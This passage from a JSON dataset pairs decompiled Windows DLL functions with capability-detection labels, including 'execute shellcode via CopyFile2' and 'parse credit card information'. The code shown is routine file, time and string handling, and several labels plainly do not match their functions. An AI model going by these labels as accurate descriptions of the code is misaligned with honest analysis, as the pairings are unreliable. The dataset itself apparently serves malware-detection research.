        "decompiled_code": "\nint32_t * fcn.1800288bc(int32_t *arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    *(arg1 + 6) = 0;\n    *(arg1 + 8) = 8;\n    arg1[1] = 0;\n    arg1[2] = 1;\n    arg1[3] = 0;\n    *(arg1 + 4) = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    *arg1 = iVar2;\n    if (iVar2 == -1) {\n        fcn.1800124cc();\n        pcVar1 = swi(3);\n        piVar3 = (*pcVar1)();\n        return piVar3;\n    }\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(arg1 + 10);\n    return arg1;\n}\n",
        "token_count": 206
    },
    "18002bd3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint64_t fcn.18002bd38(int64_t arg1)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint16_t *puVar3;\n    uint32_t *puVar4;\n    code *pcVar5;\n    uint64_t uVar6;\n    \n    if ((*(arg1 + 0x20) & 1) == 0) {\n        fcn.18002b424(4, *(arg1 + 0x18));\n        pcVar5 = swi(3);\n        uVar6 = (*pcVar5)();\n        return uVar6;\n    }\n    uVar6 = *(arg1 + 0x38) + 2;\n    if (*(arg1 + 0x40) <= uVar6 && uVar6 != *(arg1 + 0x40)) {\n        fcn.18002b7a4(arg1, (*(arg1 + 0x38) - *(arg1 + 0x40)) + 2);\n    }\n    puVar3 = *(arg1 + 0x38);\n    uVar1 = *puVar3;\n    *(arg1 + 0x38) = puVar3 + 1;\n    if (uVar1 == 0xffff) {\n        if ((*(arg1 + 0x20) & 1) == 0) {\n            fcn.18002b424(4, *(arg1 + 0x18));\n            pcVar5 = swi(3);\n            uVar6 = (*pcVar5)();\n            return uVar6;\n        }\n        if (*(arg1 + 0x40) <= puVar3 + 3 && puVar3 + 3 != *(arg1 + 0x40)) {\n            fcn.18002b7a4(arg1, (*(arg1 + 0x38) - *(arg1 + 0x40)) + 4);\n        }\n        puVar4 = *(arg1 + 0x38);\n        uVar2 = *puVar4;\n        uVar6 = uVar2;\n        *(arg1 + 0x38) = puVar4 + 1;\n        if (uVar2 == 0xffffffff) {\n            if ((*(arg1 + 0x20) & 1) == 0) {\n                fcn.18002b424(4, *(arg1 + 0x18));\n                pcVar5 = swi(3);\n                uVar6 = (*pcVar5)();\n                return uVar6;\n            }\n            if (*(arg1 + 0x40) <= puVar4 + 3 && puVar4 + 3 != *(arg1 + 0x40)) {\n                fcn.18002b7a4(arg1, (*(arg1 + 0x38) - *(arg1 + 0x40)) + 8);\n            }\n            uVar6 = **(arg1 + 0x38);\n            *(arg1 + 0x38) = *(arg1 + 0x38) + 1;\n        }\n    }\n    else {\n        uVar6 = uVar1;\n    }\n    return uVar6;\n}\n",
        "token_count": 690
    },
    "18002f91": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong fcn.18002f914(int64_t arg1, int64_t *arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    int64_t *piVar4;\n    uchar uVar5;\n    uchar auStackX8 [8];\n    uchar auStackX16 [8];\n    uchar auStackX24 [8];\n    int64_t iStackX32;\n    uchar auStack56 [8];\n    uchar auStack48 [24];\n    \n    fcn.180033c90(arg2, 0, 0x230);\n    iVar2 = fcn.180036208(arg2 + 0x22, 0x104, *(arg1 + 0x18), 0xffffffffffffffff);\n    if (iVar2 != 0) {\n        if (iVar2 == 0xc) {\n            fcn.1800124cc();\n            pcVar1 = swi(3);\n            uVar3 = (*pcVar1)();\n            return uVar3;\n        }\n        if ((iVar2 == 0x16) || (iVar2 == 0x22)) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            uVar3 = (*pcVar1)();\n            return uVar3;\n        }\n        if (iVar2 != 0x50) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            uVar3 = (*pcVar1)();\n            return uVar3;\n        }\n    }\n    if (*(arg1 + 8) == *0x180052280) {\ncode_r0x00018002fad2:\n        uVar3 = 1;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetFileTime)(*(arg1 + 8), auStackX8, auStackX16, auStackX24);\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetFileSizeEx)(*(arg1 + 8), &iStackX32);\n            if (iVar2 != 0) {\n                arg2[3] = iStackX32;\n                if (*(*(arg1 + 0x18) + -0x10) == 0) {\n                    *(arg2 + 4) = 0;\n                }\n                else {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)();\n                    uVar5 = iVar2;\n                    if (iVar2 == -1) {\n                        uVar5 = 0;\n                    }\n                    *(arg2 + 4) = uVar5;\n                }\n                iVar2 = (*_sym.imp.KERNEL32.dll_FileTimeToLocalFileTime)(auStackX8, auStack56);\n                if (iVar2 == 0) {\ncode_r0x00018002fa25:\n                    *arg2 = 0;\n                }\n                else {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_FileTimeToSystemTime)(auStack56, auStack48);\n                    if (iVar2 == 0) goto code_r0x00018002fa25;\n                    piVar4 = fcn.180001418(auStack56, auStackX8, 0xffffffff);\n                    *arg2 = *piVar4;\n                }\n                iVar2 = (*_sym.imp.KERNEL32.dll_FileTimeToLocalFileTime)(auStackX16, auStack56);\n                if (iVar2 == 0) {\ncode_r0x00018002fa6c:\n                    arg2[2] = 0;\n                }\n                else {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_FileTimeToSystemTime)(auStack56, auStack48);\n                    if (iVar2 == 0) goto code_r0x00018002fa6c;\n                    piVar4 = fcn.180001418(auStack56, auStackX16, 0xffffffff);\n                    arg2[2] = *piVar4;\n                }\n                iVar2 = (*_sym.imp.KERNEL32.dll_FileTimeToLocalFileTime)(auStackX24, auStack56);\n                if (iVar2 == 0) {\ncode_r0x00018002fab4:\n                    arg2[1] = 0;\n                }\n                else {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_FileTimeToSystemTime)(auStack56, auStack48);\n                    if (iVar2 == 0) goto code_r0x00018002fab4;\n                    piVar4 = fcn.180001418(auStack56, auStackX24, 0xffffffff);\n                    arg2[1] = *piVar4;\n                }\n                if (*arg2 == 0) {\n                    *arg2 = arg2[1];\n                }\n                if (arg2[2] == 0) {\n                    arg2[2] = arg2[1];\n                }\n                goto code_r0x00018002fad2;\n            }\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 1094
    },
    "180030c2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.180030c2c(int16_t **arg1, int16_t *arg2, int64_t arg3, ulong arg4)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int16_t *arg1_00;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    uint64_t arg2_00;\n    \n    arg2_00 = 0;\n    if (arg2 == NULL) {\n        fcn.180012514();\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    if (arg3 == 0) {\n        fcn.180012514();\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    iVar1 = *arg2;\n    piVar7 = arg2;\n    while (iVar5 = arg2_00,  iVar1 != 0) {\n        if (*piVar7 == 0x25) {\n            uVar2 = piVar7[1];\n            if ((uVar2 < 0x31) || (0x39 < uVar2)) {\n                if ((uVar2 < 0x41) || (0x5a < uVar2)) goto code_r0x000180030cd4;\n                if (uVar2 < 0x3a) goto code_r0x000180030caf;\n                iVar6 = uVar2 - 0x38;\n            }\n            else {\ncode_r0x000180030caf:\n                iVar6 = uVar2 - 0x31;\n            }\n            piVar7 = piVar7 + 2;\n            if (arg4 <= iVar6) goto code_r0x000180030cd8;\n            if (*(arg3 + iVar6 * 8) != 0) {\n                iVar6 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                arg2_00 = iVar5 + iVar6;\n            }\n        }\n        else {\ncode_r0x000180030cd4:\n            piVar7 = piVar7 + 1;\ncode_r0x000180030cd8:\n            arg2_00 = iVar5 + 1;\n        }\n        iVar1 = *piVar7;\n    }\n    if ((1U - *(*arg1 + -4) | *(*arg1 + -6) - iVar5) < 0) {\n        fcn.180008ed0(arg1, arg2_00);\n    }\n    piVar7 = *arg1;\n    while (*arg2 != 0) {\n        iVar5 = arg2_00;\n        if (*arg2 == 0x25) {\n            uVar2 = arg2[1];\n            if ((uVar2 < 0x31) || (0x39 < uVar2)) {\n                if ((uVar2 < 0x41) || (0x5a < uVar2)) goto code_r0x000180030dc2;\n                if (uVar2 < 0x3a) goto code_r0x000180030d4c;\n                iVar6 = uVar2 - 0x38;\n            }\n            else {\ncode_r0x000180030d4c:\n                iVar6 = uVar2 - 0x31;\n            }\n            arg2 = arg2 + 2;\n            if (arg4 <= iVar6) {\n                *piVar7 = 0x3f;\n                goto code_r0x000180030d67;\n            }\n            if (*(arg3 + iVar6 * 8) != 0) {\n                iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                iVar6 = fcn.180035a14(piVar7, iVar5 + 1, *(arg3 + iVar6 * 8));\n                if (iVar6 != 0) {\n                    if (iVar6 == 0xc) {\n                        fcn.1800124cc();\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\n                    if ((iVar6 == 0x16) || (iVar6 == 0x22)) {\n                        fcn.180012514();\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\n                    if (iVar6 != 0x50) {\n                        fcn.180012514();\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\n                }\n                arg2_00 = iVar5 - iVar4;\n                piVar7 = piVar7 + iVar4;\n            }\n        }\n        else {\ncode_r0x000180030dc2:\n            *piVar7 = *arg2;\n            arg2 = arg2 + 1;\ncode_r0x000180030d67:\n            piVar7 = piVar7 + 1;\n            arg2_00 = iVar5 - 1;\n        }\n    }\n    arg1_00 = *arg1;\n    iVar5 = piVar7 - arg1_00 >> 1;\n    iVar6 = 0;\n    if (iVar5 == -1) {\n        if (arg1_00 != NULL) {\n            iVar5 = fcn.180035dc8(arg1_00, *(arg1_00 + -6));\n            goto code_r0x000180030e05;\n        }\n    }\n    else {\ncode_r0x000180030e05:\n        iVar6 = iVar5;\n        if (iVar6 < 0) goto code_r0x000180030e3f;\n    }\n    if (iVar6 <= *(*arg1 + -6)) {\n        *(*arg1 + -8) = iVar6;\n        (*arg1)[iVar6] = 0;\n        return;\n    }\ncode_r0x000180030e3f:\n    fcn.180001214(0x80070057);\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 1319
    },
    "180031fe": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.180031fe4(int64_t *arg1, ulong pvarg)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int64_t arg2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    \n    if (arg1 == NULL) {\n        return;\n    }\n    uVar3 = (*_sym.imp.OLEAUT32.dll_VariantInit)(pvarg);\n    if ((1U - *(*arg1 + -8) | *(*arg1 + -0xc) - uVar3) < 0) {\n        fcn.180008ed0(arg1, uVar3);\n    }\n    uVar5 = 0;\n    iVar1 = *arg1;\n    if ((uVar3 < 0) || (*(iVar1 + -0xc) < uVar3)) {\n        fcn.180001214(0x80070057);\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    *(iVar1 + -0x10) = uVar3;\n    arg2 = uVar3 * 2;\n    *(arg2 + *arg1) = 0;\n    iVar4 = fcn.180034220(iVar1, arg2, pvarg, arg2);\n    if (iVar4 != 0) {\n        if (iVar4 == 0xc) {\n            fcn.1800124cc();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        if ((iVar4 == 0x16) || (iVar4 == 0x22)) {\n            fcn.180012514();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        if (iVar4 != 0x50) {\n            fcn.180012514();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n    }\n    if (uVar3 == 0xffffffff) {\n        iVar1 = *arg1;\n        if (iVar1 != 0) {\n            uVar3 = fcn.180035dc8(iVar1, *(iVar1 + -0xc));\n            goto code_r0x0001800320a8;\n        }\n    }\n    else {\ncode_r0x0001800320a8:\n        uVar5 = uVar3;\n        if (uVar5 < 0) goto code_r0x0001800320d6;\n    }\n    if (uVar5 <= *(*arg1 + -0xc)) {\n        *(*arg1 + -0x10) = uVar5;\n        *(*arg1 + uVar5 * 2) = 0;\n        return;\n    }\ncode_r0x0001800320d6:\n    fcn.180001214(0x80070057);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 648
    },
    "18000133": {
        "rules": [
            "parse credit card information/e6f146abe79f47cd84115fe8b7938431"
        ],
        "decompiled_code": "\nint64_t * fcn.180001334(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    uint32_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uint32_t in_stack_00000038;\n    uchar auStack56 [12];\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t iStack36;\n    \n    if (arg2 < 0x76c) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    if (0xb < arg3 - 1U) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    if (0x1e < arg4 - 1U) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    if (0x17 < in_stack_00000028) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    if (0x3b < in_stack_00000030) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    if (0x3b < in_stack_00000038) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    iStack40 = arg3 + -1;\n    iStack36 = arg2 + -0x76c;\n    iStack44 = arg4;\n    iVar3 = fcn.1800333ac(auStack56);\n    *arg1 = iVar3;\n    if (iVar3 == -1) {\n        fcn.180001214(0x80070057);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    return arg1;\n}\n",
        "token_count": 577
    },
    "18000141": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong * fcn.180001418(ulong *arg1, ulong lpFileTime, ulong arg3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    ulong uVar4;\n    uchar auStackX32 [8];\n    ulong uStack40;\n    uint16_t uStack32;\n    uint16_t uStack30;\n    uint16_t uStack26;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_FileTimeToLocalFileTime)(lpFileTime, auStackX32);\n    if (iVar2 == 0) {\n        *arg1 = 0;\n        fcn.180001214(0x80070057);\n        pcVar1 = swi(3);\n        puVar3 = (*pcVar1)();\n        return puVar3;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_FileTimeToSystemTime)();\n    if (iVar2 == 0) {\n        *arg1 = 0;\n        fcn.180001214(0x80070057);\n        pcVar1 = swi(3);\n        puVar3 = (*pcVar1)();\n        return puVar3;\n    }\n    uVar4 = 0;\n    if (0x76b < uStack32) {\n        fcn.180001334(&uStack40, uStack32, uStack30, uStack26);\n        uVar4 = uStack40;\n    }\n    *arg1 = uVar4;\n    return arg1;\n}\n",
        "token_count": 328
    },
    "1800078e": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800078e8(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    ushort *arg2;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t *piVar6;\n    int64_t iVar7;\n    ulong arg2_00;\n    int64_t iVar8;\n    char16_t *arg3;\n    uchar auStack1032 [32];\n    uchar *puStack1000;\n    uint uStack992;\n    int64_t iStack984;\n    uchar auStack968 [8];\n    int64_t iStack960;\n    int64_t *piStack952;\n    int64_t iStack944;\n    int64_t iStack936;\n    int64_t iStack928;\n    int64_t iStack920;\n    int64_t iStack912;\n    uchar auStack904 [8];\n    ulong uStack896;\n    ushort *puStack888;\n    ushort auStack880 [132];\n    uint8_t auStack616 [20];\n    uchar auStack596 [12];\n    uint uStack584;\n    uchar auStack572 [548];\n    uint64_t uStack24;\n    \n    uStack896 = 0xfffffffffffffffe;\n    uStack24 = *0x180067ce0 ^ auStack1032;\n    iVar8 = 0;\n    puStack888 = NULL;\n    fcn.180008d9c(&puStack888, 0x208);\n    *puStack888 = 0;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryW)(0x104, puStack888);\n    if (0x104 < uVar4) {\n        fcn.180008a68(&puStack888, uVar4);\n        *puStack888 = 0;\n        (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryW)(uVar4, puStack888);\n    }\n    arg2 = puStack888;\n    uVar4 = 0;\n    if (puStack888 != NULL) {\n        uVar4 = fcn.180033b84(puStack888);\n    }\n    fcn.180008dfc(arg1 + 0x210, arg2, uVar4);\n    fcn.180017288(arg1, 0);\n    piVar6 = fcn.180012330();\n    if (piVar6 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    iStack960 = (**(*piVar6 + 0x18))(piVar6);\n    iStack960 = iStack960 + 0x18;\n    uVar4 = fcn.180033b84(\n                         L\"<TABLE border=1 cols=4 width=100%>\\n<THEAD><TR><TD width=20>&nbsp;</TD><TD>File Name</TD><TD>Size</TD><TD>Modified</TD></TR></THEAD>\"\n                         );\n    fcn.180008dfc(&iStack960, \n                  L\"<TABLE border=1 cols=4 width=100%>\\n<THEAD><TR><TD width=20>&nbsp;</TD><TD>File Name</TD><TD>Size</TD><TD>Modified</TD></TR></THEAD>\"\n                  , uVar4);\n    piStack952 = NULL;\n    fcn.18000cf28(arg1, L\"fileList\", 0x18004cfd0, &piStack952);\n    if (piStack952 == NULL) {\n        LOCK();\n        piVar1 = iStack960 + -8;\n        iVar5 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar5 + -1 < 1) {\n            (**(**(iStack960 + -0x18) + 8))();\n        }\n        if (puStack888 != auStack880) {\n            fcn.180008df4(&puStack888);\n        }\n    }\n    else {\n        fcn.180008920(&iStack936, arg1 + 0x210, L\"\\\\*.*\");\n        iVar7 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iStack936, auStack616);\n        if (iVar7 == -1) {\n            LOCK();\n            piVar1 = iStack936 + -8;\n            iVar5 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar5 + -1 < 1) {\n                (**(**(iStack936 + -0x18) + 8))();\n            }\n            if (piStack952 != NULL) {\n                (**(*piStack952 + 0x10))();\n            }\n            LOCK();\n            piVar1 = iStack960 + -8;\n            iVar5 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar5 + -1 < 1) {\n                (**(**(iStack960 + -0x18) + 8))();\n            }\n            if (puStack888 != auStack880) {\n                fcn.180008df4(&puStack888);\n            }\n        }\n        else {\n            fcn.180014058();\n            fcn.180009ac8();\n            piVar6 = fcn.180012330();\n            if (piVar6 == NULL) {\n                fcn.180001214(0x80004005);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            iStack944 = (**(*piVar6 + 0x18))();\n            iStack944 = iStack944 + 0x18;\n            piVar6 = fcn.180012330();\n            if (piVar6 == NULL) {\n                fcn.180001214(0x80004005);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            iStack928 = (**(*piVar6 + 0x18))(piVar6);\n            iStack928 = iStack928 + 0x18;\n            do {\n                fcn.180001418(auStack904, auStack596, 0xffffffff);\n                arg2_00 = fcn.1800014dc(auStack904, &iStack912);\n                fcn.180008c54(&iStack928, arg2_00);\n                LOCK();\n                piVar1 = iStack912 + -8;\n                iVar5 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n                if (iVar5 + -1 < 1) {\n                    (**(**(iStack912 + -0x18) + 8))();\n                }\n                iVar3 = iStack928;\n                arg3 = L\"file\";\n                if ((auStack616[0] & 0x10) != 0) {\n                    arg3 = L\"folder\";\n                }\n                iStack984 = iStack928;\n                uStack992 = uStack584;\n                puStack1000 = auStack572;\n                fcn.1800091a4(&iStack944, \n                              L\"<TR><TD width=20><IMG src=%s.gif></TD><TD><SPAN class=%s>%s</SPAN></TD><TD>%lu</TD><TD>%s</TD></TR>\"\n                              , arg3, arg3);\n                fcn.180008f94(&iStack960, iStack944, *(iStack944 + -0x10));\n                iVar5 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar7, auStack616);\n            } while (iVar5 != 0);\n            uVar4 = fcn.180033b84(L\"</TABLE>\");\n            fcn.180008f94(&iStack960, L\"</TABLE>\", uVar4);\n            (*_sym.imp.KERNEL32.dll_FindClose)(iVar7);\n            if (iStack960 == 0) {\n                iStack920 = 0;\n            }\n            else {\n                iVar8 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)();\n                iStack920 = iVar8;\n                if (iVar8 == 0) {\n                    fcn.180001214(0x8007000e);\n                }\n            }\n            (**(*piStack952 + 0x1c8))(piStack952, iVar8);\n            (*_sym.imp.OLEAUT32.dll_SysStringLen)(iVar8);\n            LOCK();\n            piVar1 = iVar3 + -8;\n            iVar5 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar5 + -1 < 1) {\n                (**(**(iVar3 + -0x18) + 8))();\n            }\n            LOCK();\n            piVar1 = iStack944 + -8;\n            iVar5 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar5 + -1 < 1) {\n                (**(**(iStack944 + -0x18) + 8))();\n            }\n            fcn.1800015e0(auStack968);\n            LOCK();\n            piVar1 = iStack936 + -8;\n            iVar5 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar5 + -1 < 1) {\n                (**(**(iStack936 + -0x18) + 8))();\n            }\n            if (piStack952 != NULL) {\n                (**(*piStack952 + 0x10))();\n            }\n            LOCK();\n            piVar1 = iStack960 + -8;\n            iVar5 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar5 + -1 < 1) {\n                (**(**(iStack960 + -0x18) + 8))();\n            }\n            if (puStack888 != auStack880) {\n                fcn.180008df4(&puStack888);\n            }\n        }\n    }\n    fcn.180032ea0(uStack24 ^ auStack1032);\n    return;\n}\n",
        "token_count": 2227
    },
    "18000d7a": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.18000d7ac(int64_t arg1, int32_t *arg2, uint64_t arg3, uint32_t *arg4)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int16_t aiStackX8 [4];\n    int16_t aiStack88 [4];\n    int64_t *piStack80;\n    int64_t *piStack72;\n    ulong uStack64;\n    uchar auStack56 [32];\n    \n    iVar1 = *arg2;\n    uStack64 = 0xfffffffffffffffe;\n    fcn.18001d3b4(auStack56);\n    piStack72 = NULL;\n    (**(*(arg1 + 0xe8) + 0x48))(arg1 + 0xe8, &piStack72);\n    if (piStack72 == NULL) {\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack56);\n    }\n    else {\n        piStack80 = NULL;\n        fcn.18000cf28(arg1, arg3, 0x18004dbd0, &piStack80);\n        if (piStack80 != NULL) {\n            if (iVar1 == 0) {\n                uVar2 = arg3 & 0xffffffffffff0000 | -((*arg4 & 1) != 0);\n                iVar1 = (**(*piStack80 + 0x60))(piStack80, uVar2);\n                if (-1 < iVar1) {\n                    (**(*piStack80 + 0xb0))(piStack80, uVar2 & 0xffffffffffff0000 | -((*arg4 & 2) != 0));\n                }\n            }\n            else {\n                iVar1 = (**(*piStack80 + 0x68))(piStack80, aiStack88);\n                if ((-1 < iVar1) && (iVar1 = (**(*piStack80 + 0xb8))(piStack80, aiStackX8),  -1 < iVar1)) {\n                    *arg4 = -(aiStackX8[0] != 0) & 2 | aiStack88[0] != 0;\n                }\n            }\n        }\n        if (piStack80 != NULL) {\n            (**(*piStack80 + 0x10))();\n        }\n        if (piStack72 != NULL) {\n            (**(*piStack72 + 0x10))();\n        }\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack56);\n    }\n    return;\n}\n",
        "token_count": 546
    },
    "18000a95": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n\nvoid fcn.18000a95c(int64_t arg1, uint *arg2, uint *arg3, int64_t *arg4, ulong noname_4, ulong noname_5, ulong noname_6, \n                  ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, ulong noname_12, \n                  ulong noname_13, ulong noname_14, ulong noname_15, ulong noname_16, ulong noname_17, ulong noname_18, \n                  ulong noname_19, ulong arg_b0h)\n\n{\n    int16_t iVar1;\n    ushort uVar2;\n    uint uVar3;\n    code *pcVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint64_t uVar7;\n    int64_t **ppiVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    int64_t **ppiVar12;\n    uchar *puVar13;\n    int64_t **ppiVar14;\n    uchar *puVar15;\n    ulong var_8h;\n    ulong var_10h;\n    ulong var_bp_20h;\n    ulong var_28h;\n    uchar *pvargDest;\n    ulong var_48h;\n    ulong var_50h;\n    ulong var_60h;\n    ulong var_90h;\n    ulong var_98h;\n    ulong var_a0h;\n    uchar auStack200 [64];\n    int64_t *piStack136;\n    int64_t iStack128;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    ulong uStack104;\n    ulong uStack96;\n    uchar auStack88 [24];\n    ulong uStack64;\n    uint64_t uStack56;\n    int64_t **ppiVar11;\n    \n    uStack64 = 0xfffffffffffffffe;\n    uStack56 = *0x180067ce0 ^ &stack0xffffffffffffff78;\n    ppiVar11 = NULL;\n    uStack96 = 0;\n    iVar1 = *(arg3 + 6);\n    puVar13 = &stack0xffffffffffffff38;\n    if ((-1 < iVar1) && (puVar13 = &stack0xffffffffffffff38,  iVar1 < 0x2000000000000000)) {\n        if (iVar1 == 0) {\n            ppiVar12 = NULL;\n            puVar13 = &stack0xffffffffffffff38;\n            ppiVar14 = NULL;\n        }\n        else {\n            uVar9 = iVar1 * 8;\n            ppiVar12 = ppiVar11;\n            if ((uVar9 < 0x401) && (cVar5 = fcn.18000a34c(uVar9),  cVar5 != '\\0')) {\n                uVar7 = *(arg3 + 6) * 8;\n                uVar9 = uVar7 + 0xf;\n                if (uVar9 <= uVar7) {\n                    uVar9 = 0xffffffffffffff0;\n                }\n                uVar9 = uVar9 & 0xfffffffffffffff0;\n                fcn.180047db0();\n                puVar13 = &stack0xffffffffffffff38 + -uVar9;\n                ppiVar14 = &stack0xffffffffffffff78 + -uVar9;\n            }\n            else {\n                if (*(arg3 + 6) * -8 - 1U < 0x10) {\n                    fcn.180001214(0x80070057);\n                    pcVar4 = swi(3);\n                    (*pcVar4)();\n                    return;\n                }\n                ppiVar8 = fcn.18003346c(*(arg3 + 6) * 8 + 0x10);\n                puVar13 = &stack0xffffffffffffff38;\n                ppiVar14 = ppiVar11;\n                if (ppiVar8 != NULL) {\n                    *ppiVar8 = NULL;\n                    ppiVar12 = ppiVar8;\n                    puVar13 = &stack0xffffffffffffff38;\n                    ppiVar14 = ppiVar8 + 2;\n                }\n            }\n        }\n        if (ppiVar14 == NULL) {\n            while (ppiVar12 != NULL) {\n                ppiVar11 = *ppiVar12;\n                *(puVar13 + -8) = 0x18000aa90;\n                fcn.18003342c(ppiVar12);\n                ppiVar12 = ppiVar11;\n            }\n        }\n        else {\n            iVar6 = *(arg3 + 6);\n            ppiVar8 = ppiVar14;\n            if (0 < iVar6) {\n                do {\n                    *ppiVar8 = *arg4 + ((iVar6 - ppiVar11) + -1) * 0x18;\n                    uVar10 = ppiVar11 + 1;\n                    ppiVar11 = uVar10;\n                    iVar6 = *(arg3 + 6);\n                    ppiVar8 = ppiVar8 + 1;\n                } while (uVar10 < iVar6);\n            }\n            if (*(arg1 + 0x50) != 0) {\n                uStack104 = 0x180047920;\n                piStack136 = &stack0xffffffffffffff98;\n                iStack128 = *(arg1 + 0x50) - *(arg1 + 